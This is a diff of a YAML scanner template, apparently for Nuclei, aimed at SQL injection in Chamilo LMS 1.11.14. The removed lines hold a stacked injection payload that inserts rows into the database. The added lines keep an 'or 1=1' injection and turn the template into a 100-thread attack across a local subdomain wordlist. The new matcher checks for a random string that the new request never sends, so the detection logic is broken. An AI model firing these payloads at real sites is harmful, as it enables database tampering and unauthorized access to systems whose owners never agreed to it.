@@ -1,29 +1,31 @@
-id: chamilo-lms-sqli
+id: chamilo-lms-sqli 2
 info:
   author: undefl0w
+  description: Finds sql injection in Chamilo version 1.11.14
   name: Chamilo LMS SQL Injection
   severity: high
-  description: Finds sql injection in Chamilo version 1.11.14
   tags: chamilo,sqli
-
 requests:
-  - raw:
-      - |
-        POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+- attack: sniper
+  matchers:
+  - part: body
+    type: word
+    words:
+    - '{{randstr}}'
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
 
-        type=image&field_id=image&tag=image&from=image&search=image&options=["test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{{randstr}}'); INSERT INTO extra_field_options(option_value) VALUES ('{{randstr}}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{{randstr}}', 16,0) ON DUPLICATE KEY UPDATE     tag='{{randstr}}', field_id=16, count=0;  -- "]
+    Host: {{Subdomains}}
 
-      - |
-        POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-        type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]
+    Content-Type: application/x-www-form-urlencoded
 
-    req-condition: true
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "{{randstr}}")'
+
+    type=image&field_id=image&tag=image&from=image&search=image&options=["test'')
+    or 1=1 -- "]
+
+    '
+  threads: 100
